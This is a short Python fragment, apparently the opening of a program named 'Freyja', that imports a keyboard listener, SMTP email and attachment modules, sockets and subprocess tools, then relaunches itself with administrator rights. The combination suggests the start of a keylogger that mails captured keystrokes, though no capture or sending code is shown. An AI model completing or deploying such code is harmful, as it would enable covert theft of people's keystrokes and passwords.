# Freyja v1.0.0.0

from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import datetime
import sys
from subprocess import Popen
import admin

if not admin.isUserAdmin():
        admin.runAsAdmin()
